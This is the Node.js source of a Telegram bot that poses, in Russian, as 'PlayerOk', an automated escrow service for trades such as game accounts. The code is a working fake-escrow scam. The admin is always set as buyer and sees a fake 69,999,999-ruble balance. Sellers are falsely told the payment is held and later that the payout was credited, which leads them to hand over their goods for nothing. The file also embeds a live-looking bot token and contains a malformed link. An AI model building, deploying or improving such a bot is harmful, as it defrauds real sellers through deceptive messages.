const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);

const ADMIN = 'k13_way';
const users = {};
const userSteps = {};
let currentDeal = null;

const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность сделок 24/7.\n\n• Комиссия сервиса: *1%*\n• Режим работы системы: *24/7*\n• Главный модератор: @sw1zyy01\n\n✨ Выберите нужный раздел на панели ниже:`;

const mainKb = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс профиля', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;
  
  const text = ctx.message.text || '';
  if (text.includes('deal_')) {
    if (!currentDeal) return ctx.reply('❌ Ошибка: Сделка не найдена.');
    currentDeal.s_chat = ctx.chat.id;
    
    const buyerText = `🔔 *Продавец @${currentDeal.seller} успешно принял условия сделки #${currentDeal.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${currentDeal.title}\n💰 *Сумма:* ${currentDeal.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nДля холдирования средств перейдите к оплате:`;
    bot.telegram.sendMessage(currentDeal.b_chat, buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', 'deal_pay')]]) }).catch((e) => console.log(e));
    
    return ctx.replyWithMarkdown(`🤝 *Вы приняли условия безопасной сделки #${currentDeal.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${currentDeal.title}\n💰 *Выплата:* ${currentDeal.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${currentDeal.buyer} внесет оплату на счет Гаранта PlayerOk.`);
  }

  userSteps[ctx.chat.id] = null;
  return ctx.replyWithMarkdown(welcomeText, mainKb);
});

bot.action('bal', (ctx) => {
  const username = ctx.from.username || 'user';
  const isId = username.toLowerCase() === ADMIN.toLowerCase();
  const text = `💳 *Личный кабинет пользователя* \`@${username}\`\n━━━━━━━ СИСТЕМА ГАРАНТА ━━━━━━━\n💰 *Доступный баланс:* ${isId ? '69 999 999' : '0'}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n📊 *Ваша статистика на PlayerOk:*\n• Всего операций: *0*\n• Успешных обменов: *0*\n• Открытых споров/арбитражей: *0*\n\n✅ Ваш аккаунт полностью верифицирован.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) });
});

bot.action('create', (ctx) => {
  userSteps[ctx.chat.id] = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Инициализация новой безопасной сделки* [ШАГ 1/3]\n\n👤 Введите **@юзернейм** продавца, у которого приобретаете товар, текстом прямо в этот чат:`, { parse_mode: 'Markdown' });
});

bot.on('text', async (ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;
  const state = userSteps[ctx.chat.id];
  if (!state || !state.step) return;
  const txt = ctx.message.text.trim();

  if (state.step === 'partner') {
    state.partner = txt.replace('@', '').toLowerCase();
    state.step = 'title';
    return ctx.reply('📦 *Параметры торговой операции* [ШАГ 2/3]\n\n✍️ Введите точное название товара (например: _Аккаунт Standoff 2_):', { parse_mode: 'Markdown' });
  }
  if (state.step === 'title') {
    state.title = txt;
    state.step = 'price';
    return ctx.reply('💰 *Финансовые условия сделки* [ШАГ 3/3]\n\n💳 Укажите сумму покупки в рублях (только число):', { parse_mode: 'Markdown' });
  }
  if (state.step === 'price') {
    const price = parseFloat(txt) || 1000;
    const dealId = Math.floor(100000 + Math.random() * 900000).toString();
    
    currentDeal = { id: dealId, seller: state.partner, buyer: ADMIN, title: state.title, amount: price, b_chat: ctx.chat.id };
    userSteps[ctx.chat.id] = null;

    const link = `https://t.me{ctx.botInfo.username}?start=deal_${dealId}`;
    ctx.replyWithMarkdown(`✨ *Бланк сделки #${dealId} сформирован!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${currentDeal.title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ Продавец @${currentDeal.seller} сейчас не в сети бота.\n\nПерешлите ему сообщение или кнопку ниже, чтобы он открыл её и сразу принял сделку:`, 
      Markup.inlineKeyboard([[Markup.button.url('🤝 Передать сделку продавцу', link)]])
    );
  }
});

bot.action('deal_ok', (ctx) => {
  if (!currentDeal) return ctx.answerCbQuery('Сделка не найдена.');
  currentDeal.s_chat = ctx.chat.id;
  const buyerText = `🔔 *Продавец @${currentDeal.seller} успешно принял условия сделки #${currentDeal.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${currentDeal.title}\n💰 *Сумма:* ${currentDeal.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nДля холдирования средств перейдите к оплате:`;
  bot.telegram.sendMessage(currentDeal.b_chat, buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', 'deal_pay')]]) }).catch((e) => console.log(e));
  return ctx.editMessageText(`🤝 *Вы приняли условия безопасной сделки #${currentDeal.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${currentDeal.title}\n💰 *Выплата:* ${currentDeal.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${currentDeal.buyer} внесет оплату на счет Гаранта PlayerOk.`, { parse_mode: 'Markdown' });
});

bot.action('deal_pay', (ctx) => {
  if (!currentDeal) return ctx.answerCbQuery('Сделка не найдена.');
  const sellerText = `💰 *Покупатель @${currentDeal.buyer} успешно оплатил сделку #${currentDeal.id}! Средства заморожены.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[📦 ДОСТАВКА] Ожидание отправки товара\`\n📦 *Товар:* ${currentDeal.title}\n💰 *Сумма выплат:* ${currentDeal.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *НАПОМИНАНИЕ:* Обязательно запишите процесс передачи товара на video.\n\nВам необходимо передать товар покупателю. После передачи нажмите кнопку ниже:`;
  bot.telegram.sendMessage(currentDeal.s_chat, sellerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', 'deal_sent')]]) }).catch((e) => console.log(e));
  return ctx.editMessageText(`✅ *Сделка #${currentDeal.id} успешно оплачена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔒 Средства заморожены на безопасном балансе Гаранта PlayerOk.\n\n⏳ Ожидайте, пока продавец @${currentDeal.seller} предоставит вам все необходимые данные от товара.`, { parse_mode: 'Markdown' });
});

bot.action('deal_sent', (ctx) => {
  if (!currentDeal) return ctx.answerCbQuery('Сделка не найдена.');
  const buyerText = `📦 *Продавец @${currentDeal.seller} подтвердил отправку товара по сделке #${currentDeal.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[🔎 ПРОВЕРКА] Ожидание подтверждения покупателем\`\n\nПожалуйста, тщательно проверьте полученные данные. Если все работает стабильно, закройте сделку для совершения выплаты продавцу:`;
  bot.telegram.sendMessage(currentDeal.b_chat, buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', 'deal_end')]]) }).catch((e) => console.log(e));
  return ctx.editMessageText(`✅ *Уведомление успешно отправлено покупателю.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы подтвердили передачу товара по сделке #${currentDeal.id}.\n\n⏳ Ожидаем финальной проверки со стороны покупателя.`, { parse_mode: 'Markdown' });
});

bot.action('deal_end', (ctx) => {
  if (!currentDeal) return ctx.answerCbQuery('Сделка не найдена.');
  const sellerText = `🎉 *Сделка #${currentDeal.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nПокупатель подтвердил получение. Выплата в размере ${currentDeal.amount.toLocaleString('ru-RU')} руб. успешно зачислена на баланс вашего профиля.`;
  bot.telegram.sendMessage(currentDeal.s_chat, sellerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  const buyerText = `🎉 *Сделка #${currentDeal.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Средства переведены на счет продавца.\n\n✨ Спасибо за доверие к автоматизированному гарант-сервису *PlayerOk*!`;
  return ctx.editMessageText(buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) });
});

bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }));
bot.action('safe', (ctx) => ctx.editMessageText(`🛡 *Правила безопасности маркетплейса PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\n1. *Внутренние оплаты:* Проводите финансовые транзакции исключительно через инлайн-интерфейс Гаранта.\n2. *Проверка доступов:* Тщательно проверяйте аккаунты до нажатия кнопки подтверждения.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }));
bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки пользователей PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри торговой операции — вы можете мгновенно открыть внутренний Арбитраж.\n\n✍ *Официальный контакт главного модератора:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }));

bot.launch().then(() => console.log('OK'));

http.createServer((req, res) => {
  res.writeHead(200); res.end('OK\n');
}).listen(process.env.PORT || 3000);
